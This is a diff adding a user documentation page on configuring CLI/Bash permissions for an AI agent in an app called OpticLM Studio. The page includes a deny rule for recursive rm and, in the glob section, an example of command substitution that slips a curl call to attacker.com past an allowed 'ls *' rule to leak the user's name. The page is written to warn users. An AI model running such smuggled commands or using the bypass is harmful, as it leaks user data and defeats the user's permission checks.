@@ -1,3 +1,73 @@
 ---
 title: CLI (Command-line Interface)
 ---
+
+<Callout type="warning" title="Dude, this is even more dangerous.">
+If you don't know what a “CLI” is, we recommend that you skip this chapter
+and refrain from using the related features—at the very least,
+you might want to ask the LLM in Optic what a CLI is and why it can be dangerous.
+
+In general, the CLI essentially allows the Agent to run any program on your computer,
+including malicious ones. Sometimes, the LLM may accidentally delete your files or mistakenly
+delete resources from remote services (such as GitHub, Replit, and other platforms).
+
+If you use an untrusted third-party LLM service,
+it may embed malicious CLI calls to execute malicious programs on your computer.
+</Callout>
+
+## Introduction to CLI
+
+Some programs do not expose their functionality to the Agent via MCP,
+but instead use CLI commands directly, such as [GitHub CLI](https://cli.github.com/).
+You can have the Agent execute CLI commands directly.
+
+## Configure CLI permissions
+
+CLI calls are also known as Bash calls—a common term, though not necessarily accurate.
+If you'll indulge me—Bash is a shell, and all CLIs run within a shell.
+You can also run non-CLI programs within a shell, so this term is more general.
+However, the shell on your computer isn't necessarily Bash; it's likely some other type of shell.
+Regardless, since many people call it that, we'll refer to this action as a “Bash command.”
+
+By default, all Bash commands require your consent to execute.
+If you cannot determine whether a command is malicious, ask someone you trust who can verify it, or simply refuse:
+**do not attempt to have the Agent justify the command's validity**.
+If the Agent generates an erroneous command due to a hallucination,
+this likely means it is unaware that the command will produce harmful consequences;
+consequently, if you ask it, it may still claim the command is valid.
+
+Bash command permissions can be configured in the configuration file. To quickly open the configuration file, go to the Extensions dialog -> MCP -> Open Configuration File.
+
+Configure it as follows:
+
+```json
+{
+    "bash": {
+        "enable": true,
+        "allow": ["echo *"],
+        "deny": ["rm *-r*"]
+    }
+}
+```
+
+We use [glob](https://www.google.com/search?q=glob) syntax.
+Please note that this has a serious “vulnerability.”
+Take the `ls` command as an example. It is used to list files and folders in the current directory,
+which seems completely harmless. Therefore, you might write a rule like `ls *`.
+
+However, this can be bypassed using something like `ls $(curl http://attacker.com/leak?data=$(whoami))`.
+You might say, “Then I'll just disable the $ symbol,”
+but you must understand that the CLI is designed for humans who know what they're doing.
+Consequently, it is incredibly complex and was never intended for scenarios where agents run,
+resulting in an extremely broad attack surface. Playing cat-and-mouse here is pointless.
+
+To address this issue, OpticLM Studio is developing a sandbox that allows Bash commands to be executed
+in a relatively trusted environment. Stay tuned for updates!
+
+## Be careful with permissions
+
+Here, we are referring to the permissions of the CLI tool.
+For example, if the GitHub CLI is only used by the agent and not by you,
+configure the CLI with the minimum permissions required by the agent
+and ensure you are fully aware of its capabilities.
+It is entirely possible for the agent to execute an incorrect command, resulting in data loss.
